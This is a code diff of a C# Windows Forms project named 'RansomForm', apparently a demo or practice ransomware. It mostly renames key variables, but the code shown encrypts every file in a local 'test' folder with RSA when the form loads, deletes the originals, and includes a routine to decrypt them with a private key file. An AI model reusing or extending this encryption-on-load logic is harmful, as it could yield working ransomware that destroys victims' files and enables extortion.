@@ -19,33 +19,32 @@ namespace RansomForm
     private static string ENCRYPTION_LOG = "";
     private static string DECRYPTION_LOG = "";
 
-    private byte[] rsaprivatekey;
-    private byte[] rsapublickey;
+    private byte[] privateKey;
+    private byte[] publicKey;
 
-		public Form1()
+	public Form1()
     {
       InitializeComponent();
     }
 
     private void Form1_Load(object sender, EventArgs e)
     {
-			beginEncryption();
+	  beginEncryption();
       formatFormPostEncryption();
     }
 
     private void beginEncryption()
     {
-			rsapublickey = Properties.Resources.publickey;
-			string folderpath = Directory.GetCurrentDirectory() + "\\test";
+      publicKey = Properties.Resources.publickey;
+      string folderpath = Directory.GetCurrentDirectory() + "\\test";
       encryptFolder(folderpath);
-      
     }
 
-		private void encryptFolder(string path)
+	private void encryptFolder(string path)
     {
       RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
       int bytesRead;
-      RSA.ImportRSAPublicKey(rsapublickey, out bytesRead);
+      RSA.ImportRSAPublicKey(publicKey, out bytesRead);
       foreach (string f in Directory.GetFiles(path))
       {
         if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
@@ -130,8 +129,8 @@ namespace RansomForm
       string folderpath = Directory.GetCurrentDirectory() + "\\test";
       using (FileStream fileStream = new("privatekey.pem", FileMode.Open))
       {
-        rsaprivatekey = new byte[fileStream.Length];
-        fileStream.Read(rsaprivatekey, 0, rsaprivatekey.Length);
+        privateKey = new byte[fileStream.Length];
+        fileStream.Read(privateKey, 0, privateKey.Length);
       }
       decryptFolder(folderpath);
       this.Close();
@@ -141,7 +140,7 @@ namespace RansomForm
     {
       RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
       int bytesRead;
-      RSA.ImportPkcs8PrivateKey(rsaprivatekey, out bytesRead);
+      RSA.ImportPkcs8PrivateKey(privateKey, out bytesRead);
 
       foreach (string f in Directory.GetFiles(path))
       {
@@ -202,7 +201,6 @@ namespace RansomForm
             }
           }
         }
-
         Console.WriteLine("The file was decrypted.");
         File.Delete(path);
       }
